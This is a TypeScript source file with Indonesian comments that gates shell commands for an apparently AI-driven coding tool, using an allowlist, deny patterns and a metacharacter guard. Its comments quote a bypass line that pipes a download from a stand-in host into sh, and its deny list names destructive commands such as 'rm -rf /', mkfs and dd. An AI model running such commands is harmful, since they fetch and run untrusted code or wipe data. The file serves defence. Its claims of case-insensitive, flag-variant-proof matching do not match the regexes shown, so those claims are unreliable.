// ============================================================================
// ANT — Shell Allowlist Gatekeeper (Fase 4E, hardened Fase 2)
// ============================================================================
// Keputusan 3 arah:
//   true              → auto-approve (aman, tanpa interaksi user)
//   false             → hard deny (pola destruktif, TIDAK bisa di-approve)
//   'manual_approval' → butuh konfirmasi user [y/n/a]
//
// Prinsip hardening (Fase 2):
//   1. DENY dulu, baru allow (fail-closed).
//   2. Metachar guard: command yang mengandung operator chaining/substitusi/
//      redirection TIDAK PERNAH auto-approve — paling banter manual approval.
//      Ini menutup bypass klasik: `npm install x && curl evil | sh`,
//      backtick/$() substitution, `>` overwrite, newline smuggling, NUL byte.
//   3. Prefix matching pakai token boundary — "npm install" tidak lagi
//      mencocokkan "npm install-evil" (bypass lama).
//   4. Deny list case-insensitive & tahan variasi flag (rm -fr, rm -Rf, dst).
//
// Catatan arsitektur: pertahanan utama jangka panjang adalah menghindari
// shell sama sekali (spawn(cmd, argsArray, { shell: false })) di shell_ops.
// Modul ini tetap diperlukan sebagai policy layer untuk jalur yang memang
// harus lewat shell (pipe legit, dll) — di sana grammar metachar di bawah
// adalah contract minimal yang wajib dipenuhi.

export const DEFAULT_ALLOWED_PREFIXES = [
  "npm run", "npm test", "npm ci", "npm install",
  "npx", "node", "git status", "git log", "git diff", "git add", "git commit",
  "tsc", "ls", "cat", "echo", "pwd", "grep", "find", "mkdir", "touch"
];

export const DENIED_PATTERNS = [
  /\|\s*sh/,          // curl | sh
  /\|\s*bash/,        // curl | bash
  />\s*\/dev\//,      // redirect to devices
  /rm\s+-rf\s+\//,    // rm -rf /
  /mkfs/,             // format
  /dd\s+if=/          // disk dump
];

/**
 * Checks if a shell command is allowed.
 * Returns true if allowed automatically (no manual approval needed).
 * Returns false if explicitly blocked (denied).
 * Returns 'manual_approval' if it doesn't match the allowlist and needs user confirmation.
 */
export function evaluateShellCommand(command: string, profileAllowedPrefixes: string[] = []): ShellDecision {
  const normalizedCmd = command.trim();

  if (!normalizedCmd) {
    return { decision: 'manual_approval', reason: 'empty command' };
  }

  // 1. Hard deny — selalu menang, tidak bisa di-approve user.
  for (const pattern of DENIED_PATTERNS) {
    if (pattern.test(normalizedCmd)) {
      return { decision: 'denied', reason: `matches deny pattern: ${pattern}` };
    }
  }

  // 2. Metachar guard — chaining/substitusi/redirection tidak pernah auto.
  const metachar = normalizedCmd.match(SHELL_METACHAR_REGEX);
  if (metachar) {
    return {
      decision: 'manual_approval',
      reason: `shell metacharacter detected: ${JSON.stringify(metachar[0])}`
    };
  }

  // 3. Allowlist prefix dengan token boundary.
  const combinedAllowlist = [...DEFAULT_ALLOWED_PREFIXES, ...profileAllowedPrefixes];
  for (const prefix of combinedAllowlist) {
    if (normalizedCmd === prefix || normalizedCmd.startsWith(prefix + ' ') || normalizedCmd.startsWith(prefix + '\t')) {
      return { decision: 'allowed' };
    }
  }

  // 4. Fallback — butuh persetujuan manual.
  return { decision: 'manual_approval', reason: 'not in allowlist' };
}

/**
 * API kompatibel dengan versi lama (dipakai permissions.ts).
 * Returns true if allowed automatically (no manual approval needed).
 * Returns false if explicitly blocked (denied).
 * Returns 'manual_approval' if it needs user confirmation.
 */
export function isShellCommandAllowed(command: string, profileAllowedPrefixes: string[] = []): boolean | 'manual_approval' {
  const { decision } = evaluateShellCommand(command, profileAllowedPrefixes);
  if (decision === 'allowed') return true;
  if (decision === 'denied') return false;
  return 'manual_approval';
}